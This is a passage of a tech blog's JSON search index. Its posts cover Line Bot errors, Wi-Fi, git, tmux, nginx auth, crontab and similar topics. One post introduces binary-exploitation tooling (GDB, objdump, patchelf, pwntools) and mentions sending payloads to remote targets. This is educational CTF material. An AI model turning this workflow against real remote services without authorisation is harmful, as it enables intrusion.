password?","type":"posts"},{"content":"","date":"2024/06/14","externalUrl":null,"permalink":"/tags/iphone/","section":"Tags","summary":"","title":"IPhone","type":"tags"},{"content":"","date":"2024/06/14","externalUrl":null,"permalink":"/tags/line-bot/","section":"Tags","summary":"","title":"Line Bot","type":"tags"},{"content":"在開發 Line Bot 時，若有使用到 Flex Message，可能會踩到這個坑。\nAndroid 上正常執行 # 我自己本身是 Android 用戶，某次當我在開發一個 Line Bot 應用時，我使用了 Flex Message 如下：\n1{ 2 \u0026#34;type\u0026#34;: \u0026#34;bubble\u0026#34;, 3 \u0026#34;body\u0026#34;: { 4 \u0026#34;type\u0026#34;: \u0026#34;box\u0026#34;, 5 \u0026#34;layout\u0026#34;: \u0026#34;vertical\u0026#34;, 6 \u0026#34;contents\u0026#34;: [ 7 { 8 \u0026#34;type\u0026#34;: \u0026#34;button\u0026#34;, 9 \u0026#34;action\u0026#34;: { 10 \u0026#34;type\u0026#34;: \u0026#34;postback\u0026#34;, 11 \u0026#34;label\u0026#34;: 1, 12 \u0026#34;data\u0026#34;: \u0026#34;hello\u0026#34; 13 } 14 } 15 ] 16 } 17} 後端我是用 Python 製作，在迴圈中我創建了多個如上的按鈕，用來做分頁的換頁功能，所以會顯示「1」、「2」、「3」\u0026hellip;\n乍看之下似乎沒問題，若你嘗試將這段 json 放到Flex Simulator上執行也會正常顯示，且在 Android 裝置上也能正常看到該 Flex Message 樣板。\nalt text iPhone 上出現「錯誤 無法正常執行!」 # 奇怪的是，當我在測試 iPhone 裝置時，該模板卻一直造成 iPhone 端的 Line 顯示如下錯誤：\nalt text 而我的應用上並沒有寫到關於回傳該錯誤的部份，所以這是 Line 那邊傳的\u0026hellip;\n爬文後發現相關話題幾乎沒有人在討論(?)\n自己逐步測試後，才發現問題。\nAndroid 與 iPhone 在解析時遇到問題的呈現方式不同 # 直接說上述的 flex message 問題，其實是在於那顆按鈕的label屬性只能是String型態。\n改成這樣後就正常了：\n1{ 2 \u0026#34;type\u0026#34;: \u0026#34;button\u0026#34;, 3 \u0026#34;action\u0026#34;: { 4 \u0026#34;type\u0026#34;: \u0026#34;postback\u0026#34;, 5 \u0026#34;label\u0026#34;: \u0026#34;1\u0026#34;, 6 \u0026#34;data\u0026#34;: \u0026#34;hello\u0026#34; 7 } 8} Line 的 Flex Message 其實不在意該問題；\n而傳送至客戶端後，Android 會選擇忽略該問題，仍會正常顯示；\n但 iPhone 則是選擇直接顯示錯誤\u0026hellip;\n所以這到底算不算錯誤呢\u0026hellip; 只能說是平台方型態沒有定義嚴格會衍生的狀況。\n其他可能狀況 # 爬文時，只有找到一篇 Facebook 上的貼文在討論，但似乎問題是出在圖片路徑有中文導致的：https://www.facebook.com/groups/linebot/posts/2798380053825896/\n","date":"2024/06/14","externalUrl":null,"permalink":"/posts/line-flex-message-iphone-error/","section":"","summary":"\u003cp\u003e在開發 Line Bot 時，若有使用到 Flex Message，可能會踩到這個坑。\u003c/p\u003e","title":"Line Flex Message 在 iPhone 上出現「錯誤 無法正常執行!」","type":"posts"},{"content":"用習慣了 Desktop 版本的 Ubuntu，到 command line 卻不會用指令連接 Wifi！\n注意 # 以下指令可能會需要 root 權限。\nnmcli # 1nmcli dev wifi connect \u0026lt;SSID\u0026gt; password \u0026lt;PASS\u0026gt; 把上方的「\u0026lt;SSID\u0026gt;」與「\u0026lt;PASS\u0026gt;」更換成 Wifi 的 SSID 與密碼。\n若 Wifi 沒有設置密碼，則不需要設定 password：nmcli dev wifi connect \u0026lt;SSID\u0026gt;\n日後若是要連接，則不用重複輸入密碼：\n1nmcli con up \u0026lt;SSID\u0026gt; ifconfig \u0026amp; iwconfig # 首先先啟動網卡(將下方的 \u0026lt;NIC\u0026gt; 換成無線網卡名稱)：\n1ifconfig \u0026lt;NIC\u0026gt; up 例如我的網卡叫做「wlp1s0」，則：\n1ifconfig wlp1s0 up 如果不知道自己的網卡名稱，可以透過指令查看：\n1ifconfig 然後尋找無線網卡，通常會以「wl」開頭(但不一定)。\n接著嘗試用該網卡掃描 Wifi：\n1iwlist \u0026lt;NIC\u0026gt; scan 連接 Wifi：\n1iwconfig \u0026lt;NIC\u0026gt; essid \u0026lt;SSID\u0026gt; key s:\u0026lt;PASS\u0026gt; 更改上方的「\u0026lt;NIC\u0026gt;」為網卡名稱；「\u0026lt;SSID\u0026gt;」為 Wifi SSID；「\u0026lt;PASS\u0026gt;」為密碼。\n(p.s. 密碼前方注意加上「s:」)\nReferences # 《networking - Connecting to wifi network through command line - Unix \u0026amp; Linux Stack Exchange》https://unix.stackexchange.com/questions/92799/connecting-to-wifi-network-through-command-line ","date":"2023/09/07","externalUrl":null,"permalink":"/posts/wifi-connect-with-command/","section":"","summary":"\u003cp\u003e用習慣了 Desktop 版本的 Ubuntu，到 command line 卻不會用指令連接 Wifi！\u003c/p\u003e","title":"Ubuntu 使用指令連接 Wifi","type":"posts"},{"content":"","date":"2023/09/07","externalUrl":null,"permalink":"/tags/wi-fi/","section":"Tags","summary":"","title":"Wi-Fi","type":"tags"},{"content":"","date":"2023/08/18","externalUrl":null,"permalink":"/tags/git/","section":"Tags","summary":"","title":"Git","type":"tags"},{"content":"在不同 OS 底下共同編輯一個 git repository 時，可能就會出現這個問題，要解決該問題其實也很簡單，其原理及解決方法敬請聽我娓娓道來。\n碰到的情況 # 剛 clone 一個 git repository 時，卻發現檔案顯示已被修改過，正等待 commit。\n當使用 git diff 查看時，卻看到幾乎每行的後面都顯示一個「^M」。\n簡述何為「換行符號」 # 給不知道的朋友科普一個小知識：\n其實在電腦儲存資料時，並沒有「換行」的概念，而我們所看見的「換行」其實本身也是一個「字元」。\n舉例如下方文字：\n這是第一行 這是第二行 儲存在電腦當中其實是長類似這樣「這是第一行\\n這是第二行」\n(p.s. 這只是舉例，事實上不完全是，畢竟電腦只認得二進制)\n而那個「\\n」便是常見用於表示換行符號的「Escape Character (跳脫字元)」，也被寫作「LF (Line Feed)」，ASCII Code 為「0x0A」。\n不同 OS 可能有著不同的規範 # 如上所述，換行符號本身只是一個字元，至於要用哪個字元代表「換行」\u0026hellip;\n在不同的作業系統當中，可能有著不同的定義。\n舉例來說：\nWindows：\\r\\n Mac OS：\\r Mac OS X：\\n Linux：\\n 那麼當你在不同的作業系統編輯同一份檔案時，可能會需要「轉換」換行符號才能讓作業系統正確讀懂。\ngit diff 一堆 ^M 是什麼？ # 這個問題通常是發生在用戶嘗試在 Linux 上編輯一個由 Windows 編輯過的檔案。\n依照剛剛所提到的，Windows 的換行符號為「\\r\\n」，而 Linux 則為「\\n」。\n那麼舉例當文字「第一行\\r\\n第二行」在 Windows 及 Linux 間會如何顯示呢？\n答案是：\n1# windows 2第一行 3第二行 4 5# Linux 6第一行\\r 7第二行 由於 Windows 的換行符號比 Linux 多出了一個「\\r」，因此在 Linux 作業系統當中，依舊會將「\\n」解釋成換行，而「\\r」則原封不動保留。\n這導致幾乎每行文字後方都會跟著一個「\\r」(注意，這是特殊符號表示，並不是真的顯示一個「\\r」)。\n而這個「\\r」ASCII Code 為「0x0D」，也寫作「CR」，在 git 及 vim 當中以「^M」表示。\np.s. 字元「^」在許多地方都表示ctrl，所以「^M」意思是ctrl+M。\n解決方式：自動轉換 CRLF # 在 git 當中有一項設定可以用來自動將「\\r\\n」當作「\\n」看待。\n可以簡單的透過更改git 全域設定來啟用該功能：\n1git config --global core.autocrlf true (p.s. 但在團隊開發上，更推薦的作法是更改「.gitattributes」)\nunix2dos \u0026amp; dos2unix # 補充說明，有兩個指令就是專門用來轉換換行符號的，分別是「unix2dos」及「dos2unix」。\nunix2dos：將 Linux 的「\\n」轉換為 Windows 的「\\r\\n」 dos2unix：將 Windows 的「\\r\\n」轉換為 Linux 的「\\n」 (p.s.「2」有「to」的意味)\n詳細說明請見Wiki 維基百科：https://en.wikipedia.org/wiki/Unix2dos\nReferences # 《Did Mac OS Lion switch to using line feeds (LF \u0026lsquo;\\n\u0026rsquo;) for line breaks instead of carriage returns (CR \u0026lsquo;\\r\u0026rsquo;)? - Super User》https://superuser.com/questions/439440/did-mac-os-lion-switch-to-using-line-feeds-lf-n-for-line-breaks-instead-of 《處理 Git 斷行字元的問題 | Titangene Blog》https://titangene.github.io/article/git-auto-crlf.html 《newline - Make \u0026lsquo;git diff\u0026rsquo; ignore ^M - Stack Overflow》https://stackoverflow.com/questions/1889559/make-git-diff-ignore-m ","date":"2023/08/18","externalUrl":null,"permalink":"/posts/git-crlf/","section":"","summary":"\u003cp\u003e在不同 OS 底下共同編輯一個 git repository 時，可能就會出現這個問題，要解決該問題其實也很簡單，其原理及解決方法敬請聽我娓娓道來。\u003c/p\u003e","title":"git diff 顯示一堆「^M」？","type":"posts"},{"content":"在伺服器建立多個程序時，該如何有效率的管理及切換每個程序的終端界面呢？Tmux 不僅能做到這點，還能在使用者登出後，使程序於背景繼續運作。\nScreen # 先前有介紹過指令「Screen」(在「\u0026#34;Screen\u0026#34; Command 讓程式在背景執行，並隨意切換，即便登出也不會中斷！」這篇文章中)，但比起該指令，接下來要介紹的「Tmux」相對更多人使用，也更為出名。\nTmux # 「Tmux」由「Nicholas Marriott」開發，於 2009 年 9 月 22 日釋出第一版本。\n該指令類似於先前介紹過的「Screen」，可以建立多個終端 Session，並方便的將程序於背景及前台間切換。\n可以透過以下方法安裝(具體選擇請依照不同平台決定)：\napt install tmux yum install tmux brew install tmux 或是於 Github 下載原始檔自行編譯：https://github.com/tmux/tmux\nCreate a session # 要創建一個 tmux session，你只需要輸入指令「tmux」，便會創建並進入一個 tmux session。\n乍看與一般終端無異，只是多了底下的綠色區域 如果要退出 session 則像一般的終端一樣直接輸入「exit」即可(部份情況支援使用 ctrl+d 的快捷鍵)。\n其預設的 session 名稱是以數字 0、1、2 以此類推命名創建，例如上述的範例，圖中可見左下角顯示著「[0]」，那便是該 session 的名稱(ID)。\n如果要自訂 session 名稱，可以透過指令「tmux new -s \u0026lt;name\u0026gt;」來指定，e.g.\n1# 創建名為「hello」的 tmux session 2tmux new -s hello 可以看見左下角 session 名稱變成指定的「hello」了 如果要透過一行指令創建 tmux session 並執行指令，只需要在後方加上指令即可：\n1tmux new -s hello \u0026#39;cd ~/scripts/; bash script.sh; bash\u0026#39; 例如以上範例，用「'」包圍是為了怕一些如「;」等特殊符號跳脫，最後加上「bash」則是希望在腳本執行完後，卡住 tmux session，而不是直接結束。\nBackground Session \u0026amp; Show Sessions list # 補充說明一下，\n如果要創建一個一開始就在背景執行的 session，則在創建時加入參數「-d」，e.g.\n1# 創建一個名為 \u0026#34;bg\u0026#34; 的背景 tmux session 2tmux new -d -s bg p.s. 「-d」指的是「detach」。\np.s. 切記「-d」不能緊跟在「-s」後方，會被當成是 session id 處理。(但tmux new -s bg -d這麼寫是可以的)\n如果要使當前的 session 於背景執行，可以透過 tmux 特殊的組合鍵來完成。\ntmux 的組合鍵為 ctrl+b 然後釋放按鍵後，接著按下其他功能按鍵。\n例如要使當前 session 於背景處理，則是使用功能「d (detach)」。\n因此組合按鍵為 ctrl+b, d，即同時按下 ctrl+b 後釋放，接著按下 d。\n沒意外應該就會退回原本所在的終端了。\n要查看當前背景正在運作的 tmux sessions，則可以透過指令「tmux ls」來查看：\n可以看見目前背景有兩個 tmux sessions：「alpaca」、「hello」 Attach Background Session # 要 attach 回背景的 tmux session，則需要使用指令「tmux a -t \u0026lt;session-id\u0026gt;」，e.g.\n1# attach 上名為「alpaca」的 session 2tmux a -t alpaca p.s. 其中「a」指的是「attach」；「-t」指的是「target」。\n並且當你在 tmux 的 session 當中時，tmux 也提供一個有趣的切換方式。\n使用組合鍵 ctrl+b, w，接著便可以用方向鍵在不同的 sessions 間切換(按enter即可快速 attach session)：\n按下方向鍵「=\u0026gt; (Right)」來展開 session 的程序：\np.s. 方向鍵「\u0026lt;= (Left)」可以收回展開。\nKill Session # 要刪除 session 則使用「tmux kill-session -t \u0026lt;session-id\u0026gt;」，e.g.\n1# 刪除名為 \u0026#34;hello\u0026#34; 的 tmux session 2tmux kill-session -t hello 另外也有一個參數，可以用來刪除「除了指定的 session 外的所有 sessions」，e.g.\n1# 刪除除了 \u0026#34;alpaca\u0026#34; 外的所有 tmux sessions 2tmux kill-session -a -t alpaca 要刪除所有 tmux sessions，則使用「tmux kill-server」。\np.s. 這會刪除所有 tmux 程序\nSplit Windows # 而 tmux 最廣為人知的用法則是可以將一個終端劃分多個 windows。\n分割視窗的組合鍵有兩種，分別是用於垂直分割的「ctrl+b, \u0026quot;」；及水平分割的「ctrl+b, %」。\n(p.s. 注意英文雙引號「\u0026quot;」及百分號「%」，通常需要按住shift來觸發)\n水平分割效果如下：\n垂直分割：\n並且可以多次切割：\n要在不同的 windows 間切換，則可以使用組合鍵 ctrl+b, \u0026lt;方向鍵\u0026gt;。\n(如果你不喜歡這種方式，可以看看最後補充的滑鼠操作方式)\nOthers # tmux session 指令 # tmux 提供一系列的指令可做使用(詳細不多做介紹，請自行搜索相關資料)。\n其指令輸入方式為組合鍵「ctrl+b, :」，接著輸入指令並按下 enter。\n舉例前面介紹的刪除 tmux session 的方式，使用 tmux 內部指令也可以辦到：\n1# attach 上一個 tmux session (attach \u0026#34;hello\u0026#34;) 2tmux a -t hello 3 4# 按下 \u0026lt;ctrl\u0026gt; + \u0026lt;b\u0026gt;, \u0026#34;:\u0026#34;，然後輸入「kill-session」 5:kill-session 重新命名 session # 1# 重新命名 session \u0026#34;old-name\u0026#34; 為 \u0026#34;new-name\u0026#34; 2tmux rename -t old-name new-name 啟用滑鼠操作模式 # 在滑鼠操作模式下，可以直接用滑鼠點擊 tmux windows 來切換，支援滾輪滑動終端，並且選取文字時可以自動複製。\n該功能通常預設是關閉的，可以透過上述的 tmux session 指令輸入方法來啟用。\n使用組合鍵 ctrl+b, : 後，便可以開始輸入 tmux 內部指令「set -g mouse on」，即可使用滑鼠操作模式。\n如果需要 tmux 記住該設定，每次開啟都自動啟用，則可以在 tmux config 檔案中設定。\ntmux config 檔案通常位於「~/.tmux.conf」，如果不存在則自行創建即可。\n並在檔案中寫上「set -g mouse on」。\n這裡有一些需要特別注意的部份：\n~/.tmux.conf 的檔名前方有個. tmux config 當中寫的 set -g mouse on 前方並沒有冒號「:」 若有其他指令要寫入 tmux config，請記得要空行(別寫在同一行) 並且，當更改完設定後，tmux 並不會馬上生效，有幾種方式讓 tmux 讀取新的設定：\n最暴力的方式就是直接重開 tmux，使用先前提到的「tmux kill-server」。 或者於終端輸入 tmux source-file ~/.tmux.conf 來強制 tmux 讀取設定檔。 於 tmux session 當中也可以使用 tmux session 內部指令「:source-file ~/.tmux.conf」 豐富 tmux 終端顏色 # 如果 tmux 終端顯示的文字顏色不像平常使用的終端來的豐富，\n可以試試使用 tmux 設定「set -g default-terminal \u0026quot;screen-256color\u0026quot;」來使用更多顏色。\n與滑鼠操作的部份一樣，可以直接使用 tmux 內部指令，或者加入 tmux config 當中。\n","date":"2023/08/16","externalUrl":null,"permalink":"/posts/tmux/","section":"","summary":"\u003cp\u003e在伺服器建立多個程序時，該如何有效率的管理及切換每個程序的終端界面呢？Tmux 不僅能做到這點，還能在使用者登出後，使程序於背景繼續運作。\u003c/p\u003e","title":"\"Tmux\" 指令，建立多個終端 Sessions，登出也能保留背景運作","type":"posts"},{"content":"","date":"2023/08/16","externalUrl":null,"permalink":"/tags/ssh/","section":"Tags","summary":"","title":"SSH","type":"tags"},{"content":"","date":"2023/08/16","externalUrl":null,"permalink":"/tags/tmux/","section":"Tags","summary":"","title":"Tmux","type":"tags"},{"content":" Permission # Note that the following commands may need to be run with root permission.\nLogout the user # You need to logout the user before change username.\nChange user and group name, for example, change username from older to newer:\n1usermod -l newer older 2groupmod -n newer older If system show the message usermod: user older is currently used by process xxxx when you trying to enter the commands above, it means that you have not fully logged out all of this user.\nYou can check what process is hogging the user by htop(or top), and kill the process.\nOr just kill the all processes which is run on this user, for example, to kill the all processes running by user older:\n1killall -u older Btw, you can also use the w(or who) command to check which users are logged in.\nChange home holder # For example, the new username is newer, enter the command:\n1usermod -d /home/newer -m newer If nothing else, the home folder of the user newer has been changed to /home/newer.\nReferences # 《permissions - How do I change my username? - Ask Ubuntu》https://askubuntu.com/questions/34074/how-do-i-change-my-username ","date":"2023/05/16","externalUrl":null,"permalink":"/posts/change-ubuntu-username-and-home-folder-path/","section":"","summary":"","title":"Change username and home folder in ubuntu","type":"posts"},{"content":"","date":"2023/05/16","externalUrl":null,"permalink":"/tags/nginx/","section":"Tags","summary":"","title":"Nginx","type":"tags"},{"content":"How to make nginx website require password to access ?\nMake authentication file # For example, I make the file in path /etc/nginx/htpasswd/, and name it my_auth.\nEdit it, fill in the username you want to use to login (e.g. my_user), followed by the : symbol. (p.s. Dont break the new line)\nThen save the file, type the following command to generate the password (change to your own path):\n1openssl passwd -apr1 \u0026gt;\u0026gt; /etc/nginx/htpasswd/my_auth Check the file, you should see the content looks like this:\n1my_user:$apr1$l3IuPvhA$/KzcRqpMNC7dUBG9XwQ370 For setting mutiple users:\n1my_user:$apr1$l3IuPvhA$/KzcRqpMNC7dUBG9XwQ370 2my_user2:$apr1$UePZ9SIn$HVpEhDfM5dgk2fgbGE81T/ 3my_user3:$apr1$4t8dv/wc$9Gy5Hb5hnaLO5Zwey1WbJ1 Configure nginx # Edit config file of nginx.\nFor example, my config file is /etc/nginx/conf.d/default.conf, and I want to make the users require password when accessing path of website under /admin/, add the following settings in file (server block):\n1location ~ /admin/ { 2 auth_basic \u0026#34;Login to access files.\u0026#34;; 3 auth_basic_user_file /etc/nginx/htpasswd/my_auth; 4} p.s. Dont forget to change above content to your own path of auth file.\nMake nginx reload the config # (Optional) Check it first: nginx -t\nYou can simply use command nginx -s reload to reload config, or restart the service service nginx restart.\nAnd finished.\nNow when you access the path of website, it will show such the input box:\nAccess with password References # 《How To Set Up Password Authentication with Nginx on Ubuntu 14.04 | DigitalOcean》https://www.digitalocean.com/community/tutorials/how-to-set-up-password-authentication-with-nginx-on-ubuntu-14-04 ","date":"2023/05/16","externalUrl":null,"permalink":"/posts/nginx-set-access-password/","section":"","summary":"\u003cp\u003eHow to make nginx website require password to access ?\u003c/p\u003e","title":"Set nginx access password","type":"posts"},{"content":"How to use compress file commands in linux ?\n本文源自 Chu-Siang Lai, @chusiang 之文章「GNU / Linux 各種壓縮與解壓縮指令」，在此備份作為個人筆記用途。 # Commands # Format Zip Unzip .zip zip -r filename.zip ./path unzip filename.zip .rar rar a filename.rar ./path rar e filename.rar\nunrar e filename.rar\nrar x filename.rar ./path .7z 7z a filename.7z filename\n(for encrypto: -p) 7z x filename.7z .tar tar cvf filename.tar ./path tar xvf filename.tar .tar.xz tar Jcvf filename.tar.xz ./path tar Jxvf filename.tar.xz .gz gzip filename gunzip filename.gz\ngzip -d filename.gz .tar.gz tar zcvf filename.tar.gz ./path tar zxvf filename.tar.gz .tar.bz - tar jxvf filename.tar.bz .bz2 bzip2 -z filename bzip2 -d filename.bz2\nbunzip2 filename.bz2 .tar.bz2 tar jcvf filename.tar.bz2 ./path tar jxvf filename.tar.bz2 .xz xz -z filename xz -d filename.xz .z compress filename uncompress filename.Z .tar.Z tar Zcvf filename.tar.Z ./path tar Zxvf filename.tar.Z .tgz tar zcvf filename.tgz filename tar zxvf filename.tgz .tar.tgz tar zcvf filename.tar.tgz filename tar zxvf filename.tar.tgz .lha lha -a filename.lha filename lha -e filename.lha .zst zst filename zstd -d filename.zst .tar.zst tar -I zst -cvf filename.tar.zst ./path\ntar -I zst -cvf filename.tar.zst File1 File2 tar -I zstd -xvf filename.tar.zst References # 《GNU / Linux 各種壓縮與解壓縮指令 - chusiang》http://note.drx.tw/2008/04/command.html ","date":"2023/04/25","externalUrl":null,"permalink":"/posts/linux-compress-file-commands/","section":"","summary":"\u003cp\u003eHow to use compress file commands in linux ?\u003c/p\u003e","title":"Linux 常見壓縮指令整理","type":"posts"},{"content":" Disassembly 反編譯 # 當程式執行後，檔案中的 Binary code 會被移動至記憶體上執行，並且該過程是可以被觀察的。\n在計算機概論中，大家都知道程式由Assembly language到Binary code過程稱作Assemble (組譯)，反之要從Binary code到Assemble，則稱作「Disassemble (反組譯)」，名詞為「Assembly (組譯)」、「Disassembly (反組譯)」，對應工具稱作「Assembler (組譯器)」、「Disassembler (反組譯器)」。\n透過相關的Debugger軟體，可以在程式被執行之前或執行中進行記憶體上的觀察。\n程式執行之前，透過查看執行檔的內容，將其反組譯成 Assembly language 並加以分析，該過程稱為「Static Program Analysis (SPA)」，也就是程式的靜態分析(因為程式並未被執行，而是靜態的被查看而已)；\n反之在程式執行過程中，邊執行邊組譯分析則稱作「Dynamic Program Analysis (DPA)，也就是程式的動態分析(程式已經被執行，觀察過程為動態的)。\n工欲善其事，必先利其器 # 以下會以「./binary」表示欲使用指令的二進制檔案路徑。\n「elfread」 # 了解了什麼是「ELF」後，就來提一個指令 — 「elfread」。\n顧名思義，就是可以讀取ELF 相關 info 的指令，實際操作範例如下：\n1readelf ./binary -x .text 參數「-x, --hex-dump」\n「file」 # 輸入file \u0026lt;program\u0026gt;指令即可查看該檔案的一些訊息：\n1$ file ./binary 2hello-world: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=aa3701cef10f8698f43d0972300359a60fcb09e3, for GNU/Linux 3.2.0, stripped P.s. 如果是自己編譯的朋友，所看到的資訊有不同是正常的，這取決於編譯器或 OS 等多項因素。\n「objdump」 # 可以用來將 binary 反組譯成 assembly 的程式。(當然它還有其他功能，但本系列文章著重使用該功能)\n範例使用該應用以 intel 格式反組譯二進制檔案「./binary」：\n1# 建議搭配 less 指令以方便觀看 2objdump -d -M intel ./binary | less -d 參數為「disassemble」；\n-M 參數指定程式以何種格式讀取及顯示檔案，如 intel、att、i386、amd64\u0026hellip; 等。\n「patchelf」、「ldd」 # 由於 pwn 是非常吃環境的，正常來說會希望本地端的環境與遠端的越相近越好。(這部份稍後會談到)\n而我們也在「《Pwn - 0x02》What did the \u0026#34;Compilation\u0026#34; do? And what is ELF?」這篇文章中提到，程式的執行會仰賴loader程式，也時常因「lazy binding」的特性，依賴於 libc 的版本。\n這部份可以透過「ldd」指令來查看當前程式的loader及libc檔案的路徑。使用方式為「ldd ./binary」。\n雖然說 libc 在不同版本中或許使用上感覺不出影響，但實際在底層的運作可能會因為版本而有所不同，因此有時候不得以需要手動指定應用的loader及libc版本。而「patchelf」就可以很方便的做到這點：\n1# 置換成指定的 loader 檔案 2patchelf --set-interpreter /path/to/loader ./binary 3# 將原有的 libc 至換成指定的 libc 檔案，大多數情況為「libc.so.6」，請使用「ldd」確認後自行調整 4patchelf --replace-needed libc.so.6 /path/to/libc ./binary 需要注意的是，該指令會竄改到檔案本身，建議操作前先對檔案進行備份：\n1cp ./binary ./binary.bak 2patchelf --set-interpreter /path/to/loader ./binary 3patchelf --replace-needed libc.so.6 /path/to/libc ./binary 這種更動檔案以使其更貼近所期望環境的作法稱作「patch」。\n其常見的分析軟體有IDA Pro、OllyDbg，以及常用於 Unix 系統的 Command line 程式GDB (GNU Debugger)等。\n本系列文章將以GDB來實做動態分析。\nInstall GDB # Ubuntu # 1apt-get update -y 2apt-get install -y gdb Source code # 可以在官方站點上選擇不同版本的原始碼壓縮檔 http://ftp.gnu.org/gnu/gdb\n以下示範安裝版本12.1：\n1# For example, install version 12.1 2# Get file 3wget \u0026#34;http://ftp.gnu.org/gnu/gdb/gdb-12.1.tar.gz\u0026#34; 4# Extract 5tar -xvzf gdb-12.1.tar.gz 6cd ./gdb-12.1 7# Compile 8./configure 9make 10# Install 11make install How to use? # 直接在 Terminal 上輸入「gdb」即可，也可以使用「gdb \u0026lt;program\u0026gt;」來指定要分析的軟體，如「gdb ./a.out」。\n不過本系列文章並不使用該方法，而是使用 pwntools 搭配 gdb，那\u0026hellip;什麼是 pwntools？\nPwntools # 這是一個 python 的套件，其顧名思義就是為打 pwn 而生的工具。\n直接透過 pip 安裝即可：\n1pip install pwntools 接著創建一個 python 檔案，並引用 pwntools 套件：\n1from pwn import * 其開啟程式的模式有常見的以下幾種：\n1# 創建一個本地程序 2r = process(\u0026#39;./binary\u0026#39;) 1# 創建一個遠端連線 2r = remote(\u0026#39;./binary\u0026#39;) 1# 使用 gdb 啟動本地程序，參數二可以放 gdb 指令，指令部份之後會介紹到 2r = gdb.debug(\u0026#39;./binary\u0026#39;, \u0026#39;b main\u0026#39;) 1# 創建一個程序，並用 gdb attach 上該程序進行動態分析 2# 與上者還是有些許差異，不過這部份就是「坑」了，日後踩到再說 3r = process(\u0026#39;./binary\u0026#39;) 4gdb.attach(r, \u0026#39;b main\u0026#39;) 本系列文章將以「gdb.debug()」進行動態分析；\n以「r.process()」進行最後的 payload 測試；\n以「r.remote()」進行實際攻擊。\np.s. 上文中「payload」一詞中文譯作「負載」，指的是資料傳遞中的實際資訊。在此情境指的是那些「能夠繞過程式防護觸發到弱點的攻擊語法」，有些人也會以「exploit」稱呼。\nReferences # 《再觀電腦！ ep.1 黃恩明》https://hackmd.io/@enmingw32/Sk0l2OJHP?print-pdf#/ 《負載 (電腦) - 維基百科，自由的百科全書》https://zh.wikipedia.org/zh-tw/%E8%B4%9F%E8%BD%BD_(%E8%AE%A1%E7%AE%97%E6%9C%BA) ","date":"2023/03/28","externalUrl":null,"permalink":"/posts/pwn-0x03-tools/","section":"","summary":"","title":"《Pwn - 0x03》Tools - GDB, Pwntools","type":"posts"},{"content":"","date":"2023/03/28","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"Pwn","type":"tags"},{"content":"","date":"2023/03/28","externalUrl":null,"permalink":"/series/pwn/","section":"Series","summary":"","title":"PWN","type":"series"},{"content":"","date":"2023/03/28","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":" Edit server config # 於終端輸入指令：\n1sudo systemctl edit getty@tty1.service 若是要自動登入於其他 tty，如tty 2則將getty@tty1.service修改為getty@tty2.service，以此類推。\n接著在該檔案中新增如下資訊：\n1[Service] 2ExecStart= 3ExecStart=-/sbin/agetty --noissue --autologin root %I $TERM 4Type=idle 其中的root為欲自動登入的使用者，可依需求自行修改。\n接著儲存檔案，在重新開機後便可以發現自動在 tty 1 登入方才所設定的使用者。\n如果檔案寫入失敗，那可能需要自行創建資料夾/etc/systemd/system/getty@tty1.service.d/及檔案/etc/systemd/system/getty@tty1.service.d/override.conf。(若非tty 1請自行修改路徑名稱)\nReferences # 《command line - How can I get autologin at startup working on Ubuntu Server 16.04.1? - Ask Ubuntu》https://askubuntu.com/questions/819117/how-can-i-get-autologin-at-startup-working-on-ubuntu-server-16-04-1\n","date":"2022/10/25","externalUrl":null,"permalink":"/posts/ubuntu-server-auto-login-tty-when-start-up/","section":"","summary":"","title":"Ubuntu Server Auto Login TTY when Start up","type":"posts"},{"content":" crontab # 可以使用「crontab」指令控制工作排程。\nEdit, List, Remove # 1crontab -e # 編輯排程 2crontab -l # 列出清單 3crontab -r # 刪除排程 如果權限允許，那也可以在上面所述的指令下，加上-u \u0026lt;user\u0026gt;參數指定欲更動何使用者的排程。\nFormat # 1# Edit this file to introduce tasks to be run by cron. 2# 3# Each task to run has to be defined through a single line 4# indicating with different fields when the task will be run 5# and what command to run for the task 6# 7# To define the time you can provide concrete values for 8# minute (m), hour (h), day of month (dom), month (mon), 9# and day of week (dow) or use \u0026#39;*\u0026#39; in these fields (for \u0026#39;any\u0026#39;). 10# 11# Notice that tasks will be started based on the cron\u0026#39;s system 12# daemon\u0026#39;s notion of time and timezones. 13# 14# Output of the crontab jobs (including errors) is sent through 15# email to the user the crontab file belongs to (unless redirected). 16# 17# For example, you can run a backup of all your user accounts 18# at 5 a.m every week with: 19# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/ 20# 21# For more information see the manual pages of crontab(5) and cron(8) 22# 23# m h dom mon dow command 在使用編輯參數「-e」後，會用預設編輯器編輯一個如上的暫存檔案。\n檔案中預設是沒有排程的，但有一些註解。\n直接在註解下方新增一行，照著格式輸入設定即可。\n可以在最後一行看到其使用格式「m h dom mon dow command」，其含意如下：\nFormat Range Example m, Minute, 分 0-59 每個小時的 30 分 30 * * * * Command h, Hour, 時 0-23 每天的 1 時 30 分 30 1 * * * Command dom, Day of Month, 日 1-31 每月的 5 號 12 時 * 12 5 * * Command mon, Month, 月 0-12 每年 7 月 14 的 0 時 1 分 1 0 14 7 * Command dow, Day of Week, 星期 0-7 (0,7 皆表示星期天) 每個星期一 * * * * 1 Command command, 指令 每週 2 的 23 時整執行 backup 指令 0 23 * * 2 backup 特殊值符號：\nSign Explanation Example * 任意時段 每天 12 時的任意分 * 12 * * * Command , 分隔多個時段 每天的 9 時及 20 時 * 9,12 * * * Command - 時間範圍 每天的 7 至 10 時 * 7-10 * * * Command /n 循環時段 每週 2 的每個小時 * \\1 * * 2 僅在開機時執行則使用「@reboot」，範例每次開機執行echo 'hello' \u0026gt; /tmp/hi：\n1@reboot echo \u0026#39;hello\u0026#39; \u0026gt; /tmp/hi Permission # 可以透過創建White List檔案來指定哪些使用者可以創建排程；\n或者透過創建Black List檔案來指定哪些使用者不能創建排程。\nWhite List：/etc/crontab.allow Black List：/etc/crontab.deny 程式的判定會先查看是否存在White List的檔案/etc/crontab.allow\n若不存在，則會查看Black List的檔案/etc/crontab.deny\n例如僅允許使用者admin及admin2執行 crontab 指令，則編輯/etc/crontab.allow：\n1# /etc/crontab.allow 2admin 3admin2 若僅不允許使用者guest及guest2執行 crontab 指令，則先確保/etc/crontab.allow不存在，接著編輯/etc/crontab.deny：\n1# /etc/crontab.deny 2guest 3guest2 /etc/init.d/cron # 輸入/etc/init.d/cron並透過status, start, stop, restart等參數\n來對 Cron 